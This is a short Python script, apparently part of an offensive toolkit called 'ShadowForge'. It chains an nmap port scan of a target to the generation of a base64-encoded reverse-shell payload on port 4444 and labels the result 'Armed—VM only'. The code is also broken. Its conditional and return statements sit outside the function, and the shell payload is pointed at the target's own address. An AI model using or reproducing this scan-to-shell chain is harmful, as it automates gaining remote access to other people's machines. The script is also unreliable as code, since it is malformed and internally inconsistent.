#!/usr/bin/env python3
import json
import argparse
from .recon import run_nmap_scan
from .payloads import gen_reverse_shell

def chain_scan_to_shell(target, port=4444):
    scan = run_nmap_scan(target, '1-1024')
    open_ports = [line for line in scan['output'].split('\n') if '/tcp open' in line]
    
if open_ports:
    shell = gen_reverse_shell(target, port, 'base64')
    return {'target': target, 'open_ports': open_ports[:3], 'payload': shell, 'status': 'Armed—VM only'}
    return {'target': target, 'status': 'Shielded—no vulns for drop'}

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='ShadowForge Auto Chain')
    parser.add_argument('--target', required=True)
    parser.add_argument('--port', default=4444, type=int)
    args = parser.parse_args()
    
    result = chain_scan_to_shell(args.target, args.port)
    print(json.dumps(result, indent=2))